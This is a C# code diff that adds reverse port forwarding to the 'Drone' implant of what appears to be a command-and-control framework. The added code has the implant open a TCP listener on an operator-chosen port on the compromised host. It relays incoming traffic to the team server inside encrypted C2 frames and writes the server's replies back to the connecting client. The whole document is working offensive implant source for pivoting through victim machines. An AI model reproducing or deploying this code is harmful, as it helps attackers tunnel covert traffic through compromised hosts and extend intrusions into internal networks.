@@ -2,6 +2,8 @@
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
+using System.Net.Sockets;
 using System.Reflection;
 using System.Security.Principal;
 using System.Threading;
@@ -24,6 +26,9 @@ public sealed class Drone
 
     private readonly List<DroneCommand> _commands = new();
     private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new();
+    
+    private readonly List<ReversePortForwardState> _rportfwdStates = new();
+    private readonly Dictionary<string, ConcurrentQueue<byte[]>> _rportfwdQueue = new();
 
     private readonly ConcurrentQueue<C2Frame> _outbound = new();
 
@@ -107,6 +112,14 @@ public sealed class Drone
                 break;
             }
 
+            case FrameType.RPORTFWD:
+            {
+                var packet = Crypto.Decrypt<ReversePortForwardPacket>(frame.Value);
+                HandleReversePortForwardPacket(packet);
+                
+                break;
+            }
+            
             default:
                 throw new ArgumentOutOfRangeException();
         }
@@ -197,6 +210,137 @@ public sealed class Drone
         
         // cancel the token
         _taskTokens[taskId].Cancel();
+    }
+
+    private void HandleReversePortForwardPacket(ReversePortForwardPacket packet)
+    {
+        switch (packet.Type)
+        {
+            case ReversePortForwardPacket.PacketType.START:
+            {
+                // create new queue
+                _rportfwdQueue.Add(packet.Id, new ConcurrentQueue<byte[]>());
+                
+                // start the forward
+                HandleNewReversePortForward(packet);
+                break;
+            }
+
+            case ReversePortForwardPacket.PacketType.DATA:
+            {
+                // queue the data
+                if (_rportfwdQueue.ContainsKey(packet.Id))
+                    _rportfwdQueue[packet.Id].Enqueue(packet.Data);
+                
+                break;
+            }
+
+            case ReversePortForwardPacket.PacketType.STOP:
+            {
+                var state = _rportfwdStates.Find(s => s.Id.Equals(packet.Id));
+                if (state is null)
+                    return;
+                
+                state.Dispose();
+
+                _rportfwdStates.Remove(state);
+                _rportfwdQueue.Remove(packet.Id);
+
+                break;
+            }
+            
+            default:
+                throw new ArgumentOutOfRangeException();
+        }
+    }
+
+    private void HandleNewReversePortForward(ReversePortForwardPacket packet)
+    {
+        var bindPort = BitConverter.ToInt32(packet.Data, 0);
+        var listener = new TcpListener(new IPEndPoint(IPAddress.Any, bindPort));
+        
+        listener.Start(100);
+
+        var state = new ReversePortForwardState(packet.Id, listener);
+        listener.BeginAcceptSocket(ClientCallback, state);
+        
+        if (!_rportfwdStates.Any(s => s.Id.Equals(packet.Id)))
+            _rportfwdStates.Add(state);
+    }
+
+    private void ClientCallback(IAsyncResult ar)
+    {
+        if (ar.AsyncState is not ReversePortForwardState state)
+            return;
+
+        try
+        {
+            var client = state.Listener.EndAcceptSocket(ar);
+            state.ClientSocket = client;
+            
+            // receive from socket
+            client.BeginReceive(
+                state.Buffer,
+                0,
+                ReversePortForwardState.BufferSize,
+                SocketFlags.None,
+                ReceiveCallback,
+                state);
+        }
+        catch (ObjectDisposedException)
+        {
+            // ignore
+        }
+    }
+
+    private void ReceiveCallback(IAsyncResult ar)
+    {
+        if (ar.AsyncState is not ReversePortForwardState state)
+            return;
+
+        var received = state.ClientSocket.EndReceive(ar);
+        if (received == 0) return;
+        
+        // write received into stream
+        state.WriteDataToStream(received);
+        
+        // need to read more?
+        if (received >= ReversePortForwardState.BufferSize)
+        {
+            state.ClientSocket.BeginReceive(
+                state.Buffer,
+                0,
+                ReversePortForwardState.BufferSize,
+                SocketFlags.None,
+                ReceiveCallback,
+                state);
+        }
+        else
+        {
+            // send data to TS
+            var packet = new ReversePortForwardPacket
+            {
+                Id = state.Id,
+                Type = ReversePortForwardPacket.PacketType.DATA,
+                Data = state.GetStreamData()
+            };
+
+            SendC2Frame(new C2Frame(FrameType.RPORTFWD, Crypto.Encrypt(packet)));
+            
+            // wait for response
+            byte[] outbound;
+            while (!_rportfwdQueue[state.Id].TryDequeue(out outbound))
+                Thread.Sleep(10);
+            
+            // send response
+            state.ClientSocket.Send(outbound, 0, outbound.Length, SocketFlags.None);
+            
+            // close client connection
+            state.DisconnectClient();
+            
+            // listen again
+            state.Listener.BeginAcceptSocket(ClientCallback, state);
+        }
     }
 
     public void SendTaskRunning(string taskId)
